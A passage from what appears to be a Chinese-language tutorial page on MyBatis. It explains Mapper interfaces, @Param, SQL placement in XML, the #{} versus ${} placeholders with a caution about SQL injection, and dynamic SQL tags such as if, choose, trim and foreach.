href="#1-5-1-Mapper-接口概述" class="headerlink" title="1.5.1. Mapper 接口概述"></a>1.5.1. Mapper 接口概述</h5><p>我们将在 Mapper 接口中定义与 Pojo 所对应的表相关的<strong>操作方法</strong>（如查询、插入、更新、删除等）。</p><p>每个表对应一个 Pojo，每个 Pojo 又对应一个 Mapper 接口。</p><p>Mapper 接口的作用类似于传统的 Dao 接口，通常位于 <code>mapper</code> 或 <code>dao</code> 包下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapper</span>                                           <span class="hljs-comment">// 表示 MyBatis 的 Mapper 接口</span><br><span class="hljs-meta">@Repository</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> &#123;  <br>    List&lt;User&gt; <span class="hljs-title function_">getUserById</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;id&quot;)</span> <span class="hljs-type">int</span> id)</span>;  <br>  <br>    List&lt;User&gt; <span class="hljs-title function_">getAllUsers</span><span class="hljs-params">()</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>Mapper 接口的命名通常采用 <code>Entity Pojo + Mapper</code> 的形式，例如：<code>t_user</code> 对应 <code>User</code>，则 Mapper 接口命名为 <code>UserMapper</code></li><li><code>@Mapper</code> 别忘记加入，这样当我们使用 <code>@MapperScan</code> 扫描该类的时候，会自动创建代理对象注入到 IOC 容器中（无需再额外使用 <code>@Repository</code> 标注了）<ol><li><code>@Mapper</code> + <code>@Repository</code></li><li><code>@Mapper</code> + <code>@MapperScan</code>（推荐，省事）</li></ol></li></ol></blockquote><hr><h5 id="1-5-2-Mapper-接口定义方法"><a href="#1-5-2-Mapper-接口定义方法" class="headerlink" title="1.5.2. Mapper 接口定义方法"></a>1.5.2. Mapper 接口定义方法</h5><h6 id="1-5-2-1-方法名"><a href="#1-5-2-1-方法名" class="headerlink" title="1.5.2.1. 方法名"></a>1.5.2.1. 方法名</h6><p>方法名称的命名应确保清晰且易于维护，通常以动词开头，以明确表示所执行的操作。例如：</p><ol><li><code>insertUser</code></li><li><code>updateUser</code></li><li><code>deleteUser</code></li><li><code>selectUserById</code></li></ol><blockquote><p>[!NOTE] 注意事项：务必注意</p><ol><li>如果是使用 Mapper XML 书写 SQL 语句，务必保证<strong>方法的名称</strong>和 <strong>SQL 的 ID</strong> <strong>一致</strong></li></ol></blockquote><hr><h6 id="1-5-2-2-返回类型"><a href="#1-5-2-2-返回类型" class="headerlink" title="1.5.2.2. 返回类型"></a>1.5.2.2. 返回类型</h6><ol><li>&#x3D;&#x3D;DML 语句&#x3D;&#x3D;：<ol><li>使用 <code>int</code> 作为返回类型</li><li>返回的是本次操作所影响的行数</li></ol></li><li>&#x3D;&#x3D;DQL 语句&#x3D;&#x3D;：<ol><li><font color="#00b0f0">统计查询（聚合函数</font>）：<ol><li>使用 <code>int</code> 作为返回值</li></ol></li><li><font color="#00b0f0">查询结果有 Pojo 载体</font>：<ol><li>使用 <code>List&lt;Pojo&gt;</code> 作为返回值</li><li><code>List&lt;Pojo&gt;</code> 中的每个 Pojo 对象都代表一行数据</li></ol></li><li><font color="#00b0f0">查询结果无 Pojo 载体</font>：<ol><li>使用 <code>List&lt;Map&lt;String,Object&gt;&gt;</code> 作为返回值</li></ol></li></ol></li></ol><hr><h6 id="1-5-2-3-参数类型"><a href="#1-5-2-3-参数类型" class="headerlink" title="1.5.2.3. 参数类型"></a>1.5.2.3. 参数类型</h6><p>参数类型可以根据实际需求灵活选择，Java 中的所有数据类型均可作为参数传入。</p><p>无论方法中需要传递多少个参数，我们都<strong>推荐为每个参数显式使用 <code>@Param</code> 注解</strong>。这是 MyBatis 提供的注解，用于为传入 SQL 的参数命名，以确保 SQL 语句中能够准确引用对应参数，提升可读性和可维护性。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@Mapper</span><br>public interface UserMapper &#123;<br><br>    <span class="hljs-selector-tag">User</span> <span class="hljs-selector-tag">findUserByIdAndName</span>(<span class="hljs-variable">@Param</span>(<span class="hljs-string">&quot;id&quot;</span>) int id, <span class="hljs-variable">@Param</span>(<span class="hljs-string">&quot;name&quot;</span>) String name);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>需要注意的是：<strong>在 MyBatis 中，方法传入的参数会被封装为类似 Map 的结构，然后传递给对应的 SQL 语句</strong>。这个 Map 中的每个键名，默认是由 MyBatis 自动生成的（例如 <code>param1</code>、<code>param2</code> 等），不仅不直观，而且不利于后期维护。</p><p>这就是我们<strong>推荐为每个参数显式使用 <code>@Param</code> 注解</strong>的原因。通过 <code>@Param</code>，我们可以清晰地为每个参数指定名称，确保 SQL 语句中能够准确引用，提升代码可读性。</p><p>例如上面这个例子，传递到 SQL 层时，参数结构大致为：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;张三&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>如果方法中包含多个集合参数，比如两个 <code>List</code> 类型的集合，参数结构大致为：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-string">&quot;users&quot;</span><span class="hljs-operator">:</span> <span class="hljs-punctuation">[</span>                                                 <span class="hljs-operator">//</span> <span class="hljs-built_in">List</span><span class="hljs-operator">&lt;</span><span class="hljs-variable">User</span><span class="hljs-operator">&gt;</span> <br>    <span class="hljs-punctuation">&#123;</span><span class="hljs-string">&quot;id&quot;</span><span class="hljs-operator">:</span> <span class="hljs-number">1</span><span class="hljs-operator">,</span> <span class="hljs-string">&quot;name&quot;</span><span class="hljs-operator">:</span> <span class="hljs-string">&quot;张三&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-operator">,</span><br>    <span class="hljs-punctuation">&#123;</span><span class="hljs-string">&quot;id&quot;</span><span class="hljs-operator">:</span> <span class="hljs-number">2</span><span class="hljs-operator">,</span> <span class="hljs-string">&quot;name&quot;</span><span class="hljs-operator">:</span> <span class="hljs-string">&quot;李四&quot;</span><span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">]</span><span class="hljs-operator">,</span><br>  <span class="hljs-string">&quot;products&quot;</span><span class="hljs-operator">:</span> <span class="hljs-punctuation">[</span>                                              <span class="hljs-operator">//</span> <span class="hljs-built_in">List</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">Product</span><span class="hljs-operator">&gt;</span><br>    <span class="hljs-punctuation">&#123;</span><span class="hljs-string">&quot;id&quot;</span><span class="hljs-operator">:</span> <span class="hljs-number">101</span><span class="hljs-operator">,</span> <span class="hljs-string">&quot;carName&quot;</span><span class="hljs-operator">:</span> <span class="hljs-string">&quot;宝马&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-operator">,</span><br>    <span class="hljs-punctuation">&#123;</span><span class="hljs-string">&quot;id&quot;</span><span class="hljs-operator">:</span> <span class="hljs-number">102</span><span class="hljs-operator">,</span> <span class="hljs-string">&quot;carName&quot;</span><span class="hljs-operator">:</span> <span class="hljs-string">&quot;奔驰&quot;</span><span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>只在 Mapper 接口中需要标注 <code>@Param</code>，其他地方不用标注</li></ol></blockquote><hr><h4 id="1-6-编写-SQL-语句"><a href="#1-6-编写-SQL-语句" class="headerlink" title="1.6. 编写 SQL 语句"></a>1.6. 编写 SQL 语句</h4><h5 id="1-6-1-编写-SQL-语句概述"><a href="#1-6-1-编写-SQL-语句概述" class="headerlink" title="1.6.1. 编写 SQL 语句概述"></a>1.6.1. 编写 SQL 语句概述</h5><p>虽然我们可以在两个地方编写 SQL 语句，但是我们推荐使用 XML 方式编写 SQL语句：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span>  </span></span><br><span class="hljs-meta"><span class="language-xml">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span>  </span></span><br><span class="hljs-meta"><span class="language-xml">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span>  </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.example.spring_data_mybatis.mapper.datasource1.UserMapper&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getUserById&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;User&quot;</span> &gt;</span>      // 标红不用管</span><br><span class="language-xml">        select * from user where id = #</span><span class="hljs-template-variable">&#123;id&#125;</span><span class="language-xml">    </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>  </span><br><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getAllUsers&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span>  </span><br><span class="language-xml">        select * from user    </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>  </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span></span><br></code></pre></td></tr></table></figure><hr><h5 id="1-6-2-SQL-语句编写规则"><a href="#1-6-2-SQL-语句编写规则" class="headerlink" title="1.6.2. SQL 语句编写规则"></a>1.6.2. SQL 语句编写规则</h5><h6 id="1-6-2-1-书写位置"><a href="#1-6-2-1-书写位置" class="headerlink" title="1.6.2.1. 书写位置"></a>1.6.2.1. 书写位置</h6><p>在 MyBatis 中，SQL 语句与 Java 代码是分离的，SQL 语句可以通过以下两种方式进行定义：</p><ol><li>通过注解在 <code>Mapper</code> 接口中直接编写 SQL 语句，尽管这种方式简便，但缺乏可维护性并且不支持复杂的映射规则和 SQL 语句</li><li>通过 <code>Mapper XML</code> 文件编写 SQL 语句，并且可以设置详细的映射规则，提供了更强的灵活性，支持复杂的映射规则和 SQL 语句（一个 Mapper 接口对应一个 Mapper XML 映射文件）</li></ol><p>无论选择哪种方式，我们都需要注册 SQL 与 Mapper 之间的映射（<code>mapper-locations</code> 或 <code>@MapperScan</code>），并且扫描 Mapper 接口，让 MyBatis 为其生成代理对象（<code>@MapperScan</code>）</p><blockquote><p>[!NOTE] 注意事项</p><ol><li>还是推荐在 <code>Mapper XML</code> 中编写 SQL 语句</li></ol></blockquote><hr><h6 id="1-6-2-2-书写要求"><a href="#1-6-2-2-书写要求" class="headerlink" title="1.6.2.2. 书写要求"></a>1.6.2.2. 书写要求</h6><ol><li>虽然你可以在 <code>@Mapper</code> 接口或 XML 映射文件中书写<strong>任意类型</strong>的 SQL（包括 DDL、DCL 等），但 MyBatis 的核心定位是数据操作层，主要聚焦在 <strong>DQL（查询）和 DML（增删改）</strong> 上。其他类型的语句虽然技术上可行，但 不推荐使用，建议<strong>直接规避</strong>此类用法。</li><li>编写 SQL 时，<strong>请勿在语句末尾添加分号</strong>（<code>;</code>）</li></ol><hr><h6 id="1-6-2-3-占位符传值"><a href="#1-6-2-3-占位符传值" class="headerlink" title="1.6.2.3. 占位符传值"></a>1.6.2.3. 占位符传值</h6><ol><li>&#x3D;&#x3D;#{parameter-name}&#x3D;&#x3D;：<ol><li>MyBatis 会对参数值进行预处理，确保参数被正确转义（例如：字符串 <code>&quot;asc&quot;</code> 被转义为 <code>&#39;asc&#39;</code>，字符 <code>&#39;男&#39;</code> 保持为为 <code>&#39;男&#39;</code>，数字 <code>1</code> 保持为 <code>1</code>），从而有效防止 SQL 注入攻击。通常用于查询条件、字段赋值等场景</li></ol></li><li>&#x3D;&#x3D;${parameter-name}&#x3D;&#x3D;：<ol><li>用于动态拼接 SQL 语句，将参数值直接嵌入 SQL 中，不做任何预处理（例如：字符串 <code>&quot;asc&quot;</code> 为 <code>asc</code>，字符 <code>&#39;男&#39;</code> 为 <code>男</code>，数字 <code>1</code> 为 <code>1</code>）。这种方式存在 SQL 注入的风险，因此严禁使用用户输入的数据作为 <code>$&#123;&#125;</code> 的参数<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">// <span class="hljs-number">1.</span> 定义 <span class="hljs-keyword">SQL</span> 语句<br>&lt;<span class="hljs-keyword">select</span> id=&quot;findUserByIdAndName&quot; resultType=&quot;User&quot;&gt;<br>    <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">WHERE</span> id = #&#123;id&#125; <span class="hljs-keyword">AND</span> <span class="hljs-type">name</span> = #&#123;<span class="hljs-type">name</span>&#125; <br>&lt;/<span class="hljs-keyword">select</span>&gt;<br><br><br><br>// <span class="hljs-number">2.</span> 传递参数值<br><span class="hljs-built_in">public</span> interface UserMapper &#123;<br>    <span class="hljs-keyword">User</span> findUserByIdAndName(@Param(&quot;id&quot;) <span class="hljs-type">int</span> id, @Param(&quot;name&quot;) String <span class="hljs-type">name</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><blockquote><p>[!NOTE] 注意事项：</p><ol><li>推荐使用 <code>@Param</code> 为每个参数指定 <code>param-name</code>，以提高代码可读性和可维护性。</li><li><code>@Param(&quot;id&quot;)</code> 中的名称应与 SQL 语句中的 <code>#&#123;id&#125;</code> 保持一致，确保正确映射</li><li>支持传递 <code>List</code>、<code>Map</code>、<code>Pojo</code> 等参数类型。如果是单个对象，直接使用其键或属性；如果是多个对象，则需要使用 <code>#&#123;param-name.xxx&#125;</code> 来指定具体那个对象的键或属性</li></ol></blockquote><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">// <span class="hljs-number">1.</span> 定义 <span class="hljs-keyword">SQL</span> 语句<br>&lt;<span class="hljs-keyword">select</span> id=&quot;findUserByCriteria&quot; resultType=&quot;User&quot;&gt;<br>    <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">WHERE</span> id = #&#123;<span class="hljs-keyword">user</span>.id&#125; <span class="hljs-keyword">AND</span> address = #&#123;address.city&#125;<br>&lt;/<span class="hljs-keyword">select</span>&gt;<br><br><br>// <span class="hljs-number">2.</span> 传递参数值<br><span class="hljs-built_in">public</span> interface UserMapper &#123;<br>    <span class="hljs-keyword">User</span> findUserByCriteria(@Param(&quot;user&quot;) <span class="hljs-keyword">User</span> <span class="hljs-keyword">user</span>, @Param(&quot;address&quot;) Address address);  <br>&#125;<br></code></pre></td></tr></table></figure><hr><h6 id="1-6-2-4-动态-SQL"><a href="#1-6-2-4-动态-SQL" class="headerlink" title="1.6.2.4. 动态 SQL"></a>1.6.2.4. 动态 SQL</h6><p>&#x3D;&#x3D;1.动态 SQL 概述&#x3D;&#x3D;</p><p>我们在定义 SQL 语句时，通常会使用占位符（如 <code>#&#123;name&#125;</code>）来传值。但这时就需要考虑几种常见的情况：</p><ol><li>在批量处理的时候，可能需要 N 组占位符：例如 <code>INSERT INTO user (name, age, email) VALUES (#&#123;name1&#125;, #&#123;age1&#125;, #&#123;email1&#125;),(#&#123;name2&#125;, #&#123;age2&#125;, #&#123;email2&#125;),(#&#123;name3&#125;, #&#123;age3&#125;, #&#123;email3&#125;);</code> 真能手动一个一个传 <code>name1、name2、...</code> 吗？不太现实。</li><li>再比如，我们定义了两个参数 <code>#&#123;name&#125;</code> 和 <code>#&#123;age&#125;</code>，但调用时只传了 <code>name</code>，如果直接执行这个 SQL 就会报错。那怎么办？</li></ol><p>这就引出了我们的动态 SQL，原生 MySQL 并不支持动态 SQL，但 MyBatis 提供了非常强大的动态 SQL 标签机制，帮我们优雅地解决这些问题。</p><p>&#x3D;&#x3D;2.if：逐个判断&#x3D;&#x3D;<br>逐个检查每个 <code>&lt;if&gt;</code> 语句，只要条件成立，就会进行拼接。</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;insertUser&quot;</span>&gt;</span></span><br><span class="language-xml">    INSERT INTO user (name, age)</span><br><span class="language-xml">    VALUES</span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;name != null&quot;</span>&gt;</span>#</span><span class="hljs-template-variable">&#123;name&#125;</span><span class="language-xml">,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;age != null&quot;</span>&gt;</span>#</span><span class="hljs-template-variable">&#123;age&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span></span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>动态 SQL 系列的功能远不止判断某个字段是否为 null。我们不应该把它简单理解为仅用于“!&#x3D; null”的判断，而应将其看作一种强大的条件拼接工具 —— 只要条件成立，就能灵活地动态生成 SQL 语句。</li></ol></blockquote><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;<span class="hljs-keyword">select</span> id=&quot;selectByUsernameAndEmailLike&quot; resultType=&quot;com.macro.mall.tiny.model.UmsAdmin&quot;&gt;<br>    <span class="hljs-keyword">select</span> username,<br>           <span class="hljs-keyword">password</span>,<br>           icon,<br>           email,<br>           nick_name   <span class="hljs-keyword">as</span> nickName,<br>           note,<br>           create_time <span class="hljs-keyword">as</span> createTime,<br>           login_time  <span class="hljs-keyword">as</span> loginTime,<br>           status<br>    <span class="hljs-keyword">from</span> ums_admin<br>    <span class="hljs-keyword">where</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br>    &lt;<span class="hljs-keyword">if</span> test=&quot;username!=null and username!=&#x27;&#x27;&quot;&gt;<br>        <span class="hljs-keyword">and</span> username <span class="hljs-keyword">like</span> concat(<span class="hljs-string">&#x27;%&#x27;</span>,#&#123;username&#125;,<span class="hljs-string">&#x27;%&#x27;</span>)<br>    &lt;/<span class="hljs-keyword">if</span>&gt;<br>    &lt;<span class="hljs-keyword">if</span> test=&quot;email!=null and email!=&#x27;&#x27;&quot;&gt;<br>        <span class="hljs-keyword">and</span> email <span class="hljs-keyword">like</span> concat(<span class="hljs-string">&#x27;%&#x27;</span>,#&#123;email&#125;,<span class="hljs-string">&#x27;%&#x27;</span>)<br>    &lt;/<span class="hljs-keyword">if</span>&gt;<br>&lt;/<span class="hljs-keyword">select</span>&gt;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.choose：多个选一&#x3D;&#x3D;<br>类似于 <code>if-else</code> 结构，可以根据多个条件判断，从中<strong>选择第一个符合条件的</strong>拼接。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;<span class="hljs-keyword">select</span> id=&quot;findUser&quot; resultType=&quot;User&quot;&gt;<br>    <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <br>        &lt;choose&gt;<br>            &lt;<span class="hljs-keyword">when</span> test=&quot;name != null&quot;&gt;<span class="hljs-keyword">WHERE</span> <span class="hljs-type">name</span> = #&#123;<span class="hljs-type">name</span>&#125;&lt;/<span class="hljs-keyword">when</span>&gt;<br>            &lt;<span class="hljs-keyword">when</span> test=&quot;age != null&quot;&gt;<span class="hljs-keyword">WHERE</span> age = #&#123;age&#125;&lt;/<span class="hljs-keyword">when</span>&gt;<br>            &lt;otherwise&gt;<span class="hljs-keyword">WHERE</span> status = <span class="hljs-string">&#x27;active&#x27;</span>&lt;/otherwise&gt;<br>        &lt;/choose&gt;<br>    &lt;/<span class="hljs-keyword">where</span>&gt;<br>&lt;/<span class="hljs-keyword">select</span>&gt;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.trim：添加前后缀&#x3D;&#x3D;</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;insertUser&quot;</span>&gt;</span></span><br><span class="language-xml">    INSERT INTO user</span><br><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">trim</span> <span class="hljs-attr">prefix</span>=<span class="hljs-string">&quot;(&quot;</span> <span class="hljs-attr">suffix</span>=<span class="hljs-string">&quot;)&quot;</span> <span class="hljs-attr">suffixOverrides</span>=<span class="hljs-string">&quot;,&quot;</span>&gt;</span></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;name != null&quot;</span>&gt;</span>name,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;age != null&quot;</span>&gt;</span>age,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">trim</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    VALUES</span><br><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">trim</span> <span class="hljs-attr">prefix</span>=<span class="hljs-string">&quot;(&quot;</span> <span class="hljs-attr">suffix</span>=<span class="hljs-string">&quot;)&quot;</span> <span class="hljs-attr">suffixOverrides</span>=<span class="hljs-string">&quot;,&quot;</span>&gt;</span></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;name != null&quot;</span>&gt;</span>#</span><span class="language-xquery"><span class="hljs-built_in">&#123;name</span>&#125;</span><span class="language-xml">,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;age != null&quot;</span>&gt;</span>#</span><span class="language-xquery">&#123;age&#125;</span><span class="language-xml">,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">trim</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. prefix=&quot;</span>(<span class="hljs-string">&quot;</span><br><span class="hljs-string">1. 前缀是 (</span><br><span class="hljs-string">2. suffix=&quot;</span>)<span class="hljs-string">&quot;</span><br><span class="hljs-string">1. 后缀是 )</span><br><span class="hljs-string">3. suffixOverrides=&quot;</span>,<span class="hljs-string">&quot;</span><br><span class="hljs-string">1. 去掉最后一个多余的 ，</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;5.foreach：遍历集合&#x3D;&#x3D;<br>遍历 数组（<code>Array</code>）和 集合（<code>List、Set、Map</code>），用于批量操作</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;<span class="hljs-keyword">insert</span> id=&quot;insertUsers&quot;&gt;<br>    <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">user</span> (<span class="hljs-type">name</span>, age)<br>    <span class="hljs-keyword">VALUES</span><br>    &lt;<span class="hljs-keyword">foreach</span> collection=&quot;users&quot; item=&quot;user&quot; separator=&quot;,&quot;&gt;<br>        (#&#123;<span class="hljs-keyword">user</span>.name&#125;, #&#123;<span class="hljs-keyword">user</span>.age&#125;)<br>    &lt;/<span class="hljs-keyword">foreach</span>&gt;<br>&lt;/<span class="hljs-keyword">insert</span>&gt;<br>&quot;&quot;&quot;<br>1. collection=&quot;users&quot;：<br>1. 需要遍历的集合是 users，这通常是一个 List、Array、Set 的集合<br>2. item=&quot;<span class="hljs-keyword">user</span>&quot;：<br>2. 用于指定当前遍历元素的名称。<br>3. 每次遍历时，集合中的当前元素（例如 users 集合中的每个 User 对象，User1、User2 等）会被绑定到名为 user 的变量上。在这次遍历中，我们可以通过 user 来访问对象的属性（user.id、user.name 等）。<br>4. 需要注意的是，user 只是一个示例名称，你可以根据需要自由命名，如 temp 等都可以。<br>3. separator:&quot;,&quot;：<br>1. 指定集合元素之间的分隔符<br>&quot;&quot;&quot;<br></code></pre></td></tr></table></figure><hr><h4 id="1-7-后续操作"><a href="#1-7-后续操作" class="headerlink" title="1.7. 后续操作"></a>1.7. 后续操作</h4><p>接下来，我们需要编写 Service 接口及其实现类，在 ServiceImpl 中调用 Mapper 接口的方法，最后由 Controller 层调用 ServiceImpl 进行业务处理。</p><hr><h3 id="2-业务处理"><a href="#2-业务处理" class="headerlink" title="2. 业务处理"></a>2. 业务处理</h3><h4 id="2-1-插入操作"><a href="#2-1-插入操作" class="headerlink" title="2.1. 插入操作"></a>2.1. 插入操作</h4><h5 id="2-1-1-常规插入"><a href="#2-1-1-常规插入" class="headerlink" title="2.1.1. 常规插入"></a>2.1.1. 常规插入</h5><figure class="highlight pgsql"><table><tr><td 